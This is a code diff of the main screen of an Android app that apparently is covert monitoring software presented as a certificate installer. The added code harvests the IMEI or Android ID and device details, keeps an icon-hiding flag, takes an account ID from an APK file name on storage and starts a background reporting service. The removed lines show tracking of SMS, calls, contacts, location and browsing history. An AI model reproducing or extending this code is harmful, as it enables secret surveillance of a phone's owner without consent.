@@ -1,15 +1,10 @@
 package com.inet.android.bs;
 
 import java.io.File;
-import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.List;
-import java.util.concurrent.TimeUnit;
+import java.util.TimeZone;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.Context;
@@ -19,42 +14,43 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
 import android.content.res.Configuration;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
+import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 import android.text.Editable;
+import android.text.InputType;
 import android.text.TextWatcher;
+import android.view.ContextThemeWrapper;
 import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
 
 import com.inet.android.certificate.R;
-import com.inet.android.history.LinkService;
-import com.inet.android.location.LocationTracker;
 import com.inet.android.request.Request4;
 import com.inet.android.utils.Logging;
-
+/**
+ * MainActivity 
+ * 
+ * @author johny homicide
+ * 
+ */
 public class MainActivity extends Activity {
 	Button install;
 	Button exit;
-	LocationTracker gps;
-	LinkService link;
 	AlertDialog.Builder ad;
 	Context context;
 	final String SAVED_TIME = "saved_time";
 	Editor e;
 	SharedPreferences sp;
-	byte[] data;
-	String incFile;
 	private String aboutDev;
 	private static String LOG_TAG = "mainActivity";
-	String fileID = "id.txt";
 	String ID = null;
 	List<String> result;
-	File root;
-	File[] fileArray;
 	private String sID;
+	String imeistring;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -67,41 +63,38 @@ public class MainActivity extends Activity {
 		sp = PreferenceManager.getDefaultSharedPreferences(context);
 		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String androidVersion = android.os.Build.VERSION.RELEASE;
-		// ListApp listApp = new ListApp();
-		// listApp.getListOfInstalledApp(context);
-		// GetInfo getInfo = new GetInfo(context);
-		// getInfo.getInfo();
-		// GetContacts getCont = new GetContacts();
-		// getCont.execute(context);
-		// ArchiveSms arhSms = new ArchiveSms();
-		// arhSms.execute(context);
-		// ArchiveCall arhCall = new ArchiveCall();
-		// arhCall.execute(context);
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
-		// sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
 		e.putString("BUILD", "V_000.1");
+		if (manager.getDeviceId() != null) {
+			imeistring = manager.getDeviceId(); // *** use for mobiles
+		} else {
+			imeistring = Secure.getString(getApplicationContext()
+					.getContentResolver(), Secure.ANDROID_ID); // *** use for
+																// tablets
+		}
+		Calendar cal = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
+		long time = cal.getTimeInMillis();
 		e.putString("imei", imeistring);
 		e.putString("ABOUT", aboutDev);
 		e.putString("model", model);
 		e.putString("account", "account");
-
+		e.putString("time_setub", Long.toString(time));
+		
 		e.commit();
-
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
-		boolean getInfo = sp.getBoolean("getInfo", false);
+//		boolean getInfo = sp.getBoolean("getInfo", false);
 		if (!hasVisited) {
 			// Is the first time?
 
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
-			e.putBoolean("getInfo", true);
+			e.putBoolean("is_info", true);
 			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); 
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 			e.putString("period", "1"); // period must equal 10 min
 			e.putString("code", "-1");
 			e.commit();
@@ -121,7 +114,6 @@ public class MainActivity extends Activity {
 			viewIDDialog();
 		} else {
 			Logging.doLog(LOG_TAG, "not show dialog");
-
 			finish();
 		}
 	}
@@ -132,12 +124,21 @@ public class MainActivity extends Activity {
 	}
 
 	private boolean viewIDDialog() {
-		AlertDialog.Builder alert = new AlertDialog.Builder(this);
-
-		alert.setTitle("Attention!!!");
-		alert.setMessage("Enter account number!");
-
+		ContextThemeWrapper themedContext;
+		if (Build.VERSION.SDK_INT >= 14) {
+			themedContext = new ContextThemeWrapper(this,
+					android.R.style.Theme_DeviceDefault_Dialog);
+		} else {
+			themedContext = new ContextThemeWrapper(this,
+					android.R.style.Theme_Dialog);
+		}
+		AlertDialog.Builder alert = new AlertDialog.Builder(themedContext);
+		alert.setTitle(R.string.TitleDialog);
+		alert.setIcon(android.R.drawable.ic_dialog_alert);
+		alert.setMessage(R.string.Enter_account);
 		final EditText input = new EditText(this);
+		input.setInputType(InputType.TYPE_CLASS_NUMBER);
+		input.setMaxLines(1);
 		alert.setView(input);
 
 		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
@@ -154,69 +155,70 @@ public class MainActivity extends Activity {
 			}
 		});
 
-		alert.setNegativeButton("Cancel",
+		alert.setNegativeButton(R.string.cancel,
 				new DialogInterface.OnClickListener() {
 					public void onClick(DialogInterface dialog, int whichButton) {
 						// Canceled.
 						finish();
 					}
 				});
-		
+
 		final AlertDialog dialog = alert.create();
 		dialog.show();
 		if (input.getText().toString().length() == 0) {
-			((AlertDialog)dialog).getButton(
-					AlertDialog.BUTTON_POSITIVE).setEnabled(false);
+			((AlertDialog) dialog).getButton(AlertDialog.BUTTON_POSITIVE)
+					.setEnabled(false);
 		} else {
-			((AlertDialog)dialog).getButton(
-					AlertDialog.BUTTON_POSITIVE).setEnabled(true);
+			((AlertDialog) dialog).getButton(AlertDialog.BUTTON_POSITIVE)
+					.setEnabled(true);
 		}
-		
+
 		input.addTextChangedListener(new TextWatcher() {
-			
+
 			@Override
-			public void onTextChanged(CharSequence s, int start, int before, int count) {
+			public void onTextChanged(CharSequence s, int start, int before,
+					int count) {
 				if (input.getText().toString().length() == 0) {
-					
+
 				}
-				
+
 			}
-			
+
 			@Override
 			public void beforeTextChanged(CharSequence s, int start, int count,
 					int after) {
 				if (input.getText().toString().length() == 0) {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
 				} else {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
 				}
 			}
-			
+
 			@Override
 			public void afterTextChanged(Editable s) {
 				if (input.getText().toString().length() == 0) {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
 				} else {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
 				}
 			}
 		});
-		
+
 		return true;
 	}
 
-	public boolean getID() {
+	private boolean getID() {
 		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
 
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
 		return recursiveFileFind(file);
 	}
 
-	public boolean recursiveFileFind(File[] file1) {
+	private boolean recursiveFileFind(File[] file1) {
 		int i = 0;
 		String filePath = " ";
 		if (file1 != null) {
@@ -230,8 +232,8 @@ public class MainActivity extends Activity {
 					}
 				}
 
-				if (sID.indexOf("ts.apk") != -1) {
-					ID = sID.substring(0, sID.indexOf("t"));
+				if (sID.indexOf("fg.apk") != -1) {
+					ID = sID.substring(0, sID.indexOf("f"));
 					e = sp.edit();
 					e.putString("account", ID);
 					e.commit();
@@ -252,21 +254,12 @@ public class MainActivity extends Activity {
 	/**
 	 * Start services
 	 */
-	public void start() {
+	private void start() {
 		Logging.doLog(LOG_TAG, "start services", "start services");
 
 		startService(new Intent(MainActivity.this, Request4.class));
-
-		try {
-			TimeUnit.MILLISECONDS.sleep(1000);
-		} catch (InterruptedException e) {
-			e.printStackTrace();
-		}
-
-		startService(new Intent(MainActivity.this, LocationTracker.class));
-		startService(new Intent(MainActivity.this, LinkService.class));
-
-		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
+		
+	
 	}
 
 	@Override
